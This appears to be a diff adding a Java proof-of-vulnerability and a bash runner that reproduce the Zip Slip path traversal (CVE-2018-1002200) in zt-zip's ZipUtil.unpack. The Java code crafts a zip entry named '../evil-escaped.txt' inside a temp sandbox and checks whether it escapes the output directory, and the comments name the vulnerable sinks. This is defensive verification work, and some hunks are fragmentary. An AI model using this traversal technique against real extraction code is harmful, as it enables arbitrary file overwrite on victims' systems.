+import org.zeroturnaround.zip.ZipUtil;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+/**
+ * Proof-of-vulnerability for CWE-22 (path traversal / "Zip Slip") in
+ * org.zeroturnaround.zip.ZipUtil.
+ *
+ * Root cause (primary sink exercised here):
+ *   ZipUtil.java:1152, ZipUtil.Unpacker#process(InputStream, ZipEntry)
+ *       File file = new File(outputDir, name);
+ *   `name` comes straight from the (attacker-controlled) ZipEntry name via
+ *   the NameMapper (IdentityNameMapper by default, ZipUtil.java:1150) with
+ *   no check that the resulting `file` stays inside `outputDir`. This method
+ *   is reached from the public entry points ZipUtil.unpack(File,File),
+ *   unpack(File,File,Charset), unpack(File,File,NameMapper[,Charset]) and
+ *   unpack(InputStream,File,...) (ZipUtil.java:938-1096), i.e. every call
+ *   that iterates a zip with `new Unpacker(outputDir, mapper)`.
+ *
+ * The same unchecked `new File(<dir>, <entry-derived name>)` pattern also
+ * exists at two sibling sinks that a complete fix must cover as well:
+ *   - ZipUtil.java:1260, ZipUtil.Unwraper#process (used by
+ *     ZipUtil.unwrap(File,File[,NameMapper]) and the unpack(...) overloads
+ *     that shave off the root directory, ZipUtil.java:1011-1245).
+ *   - ZipUtil.java:1214/1220, ZipUtil.BackslashUnpacker#process, where a
+ *     backslash-split path segment (`dirs[i]`, e.g. "..") is used to build
+ *     both intermediate directories and the final file with no validation.
+ *
+ * This PoV targets the Unpacker sink via the most commonly used public API,
+ * ZipUtil.unpack(File, File), which is the historical CVE-2018-1002200
+ * zt-zip Zip Slip vulnerability: a zip entry named "../evil.txt" causes the
+ * extracted file to be written *outside* the caller-supplied output
+ * directory sandbox.
+ *
+ * Exit code contract:
+ *   0 -> vulnerable behavior reproduced (file escaped outputDir)
+ *   1 -> escape did not happen (fixed) or the process errored out safely
+ */
+public class ZipSlipPov {
+
+    public static void main(String[] args) {
+        try {
+            File sandboxRoot = createTempDir("zipslip-pov");
+            File outputDir = new File(sandboxRoot, "safe-extract-target");
+            if (!outputDir.mkdirs()) {
+                throw new IOException("could not create outputDir: " + outputDir);
+            }
+
+            String marker = "ZIPSLIP-POV-MARKER-" + Long.toHexString(sandboxRoot.hashCode());
+            // A single ".." escapes outputDir and lands directly in sandboxRoot,
+            // i.e. one directory *above* the sandbox the caller intended to
+            // confine extraction to.
+            String maliciousEntryName = "../evil-escaped.txt";
+
+            File zipFile = new File(sandboxRoot, "malicious.zip");
+            writeMaliciousZip(zipFile, maliciousEntryName, marker);
+
+            // This is exactly how the vulnerable Unpacker computes the
+            // destination file: new File(outputDir, name) (ZipUtil.java:1152).
+            File expectedEscapeTarget = new File(outputDir, maliciousEntryName).getCanonicalFile();
+            String outputDirCanonical = outputDir.getCanonicalPath();
+
+            boolean threwDuringUnpack = false;
+            try {
+                ZipUtil.unpack(zipFile, outputDir);
+            } catch (Exception e) {
+                // A fixed implementation is allowed to reject the malicious
+                // entry outright (e.g. throw a ZipException) instead of
+                // silently sanitizing it - either way, no escape happened.
+                threwDuringUnpack = true;
+                System.out.println("ZipUtil.unpack(...) rejected the malicious entry: " + e);
+            }
+
+            boolean escapedFileExists = expectedEscapeTarget.isFile();
+            boolean escapedOutsideOutputDir = escapedFileExists
+                    && !expectedEscapeTarget.getCanonicalPath().startsWith(outputDirCanonical + File.separator);
+            boolean markerMatches = escapedFileExists && readFile(expectedEscapeTarget).contains(marker);
+
+            boolean vulnerable = escapedFileExists && escapedOutsideOutputDir && markerMatches;
+
+            System.out.println("outputDir            = " + outputDirCanonical);
+            System.out.println("malicious entry name = " + maliciousEntryName);
+            System.out.println("resolved escape path = " + expectedEscapeTarget);
+            System.out.println("unpack() threw        = " + threwDuringUnpack);
+            System.out.println("escape file exists    = " + escapedFileExists);
+            System.out.println("escape file outside outputDir = " + escapedOutsideOutputDir);
+            System.out.println("marker content matches        = " + markerMatches);
+
+            // best-effort cleanup
+            deleteQuietly(expectedEscapeTarget);
+            deleteRecursiveQuietly(sandboxRoot);
+
+            if (vulnerable) {
+                System.out.println("RESULT: VULNERABLE - ZipUtil.unpack() wrote a file outside the requested output directory (Zip Slip / CWE-22).");
+                System.exit(0);
+            } else {

+                System.exit(1);

+    private static void writeMaliciousZip(File zipFile, String entryName, String content) throws IOException {
+        OutputStream fos = new FileOutputStream(zipFile);
+        ZipOutputStream zos = new ZipOutputStream(fos);
+        try {
+            ZipEntry entry = new ZipEntry(entryName);
+            zos.putNextEntry(entry);
+            byte[] bytes = content.getBytes("UTF-8");
+            zos.write(bytes, 0, bytes.length);
+            zos.closeEntry();
+        } finally {
+            zos.close();
+        }
+    }
+
+    private static String readFile(File f) throws IOException {
+        InputStream in = new FileInputStream(f);
+        try {
+            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
+            byte[] buf = new byte[4096];
+            int n;
+            while ((n = in.read(buf)) != -1) {
+                out.write(buf, 0, n);
+            }
+            return new String(out.toByteArray(), "UTF-8");
+        } finally {
+            in.close();
+        }
+    }
+

+        File base = File.createTempFile(prefix, "");
+        if (!base.delete()) {
+            throw new IOException("could not delete temp file placeholder: " + base);
+        }
+        if (!base.mkdirs()) {
+            throw new IOException("could not create temp dir: " + base);
+        }
+        return base;
+    }
+
+    private static void deleteQuietly(File f) {
+        if (f != null && f.exists()) {
+            f.delete();
+        }
+    }
+
+    private static void deleteRecursiveQuietly(File f) {
+        if (f == null || !f.exists()) {
+            return;
+        }
+        File[] children = f.listFiles();
+        if (children != null) {
+            for (File c : children) {
+                deleteRecursiveQuietly(c);
+            }
+        }
+        f.delete();
+    }

+#!/usr/bin/env bash
+# Builds ZipUtil's classes with Maven, compiles the standalone PoV against
+# them, and runs it. Exits 0 iff the Zip Slip (CWE-22) path traversal in
+# org.zeroturnaround.zip.ZipUtil.Unpacker#process (ZipUtil.java:1152) is
+# reproduced, i.e. a malicious zip entry "../evil-escaped.txt" is extracted
+# outside the caller-supplied output directory by ZipUtil.unpack(File,File).
+#
+# Must be run from the repository root (/workspace/repo in the container).
+set -euo pipefail
+
+REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
+cd "$REPO_ROOT"
+
+POV_DIR="$REPO_ROOT/.security-pipeline/pov"
+BUILD_DIR="$POV_DIR/build"
+rm -rf "$BUILD_DIR"
+mkdir -p "$BUILD_DIR"
+
+# Compile the project's main sources (produces target/classes) without
+# running its test suite.
+mvn -q -B -DskipTests compile
+

+  exit 3
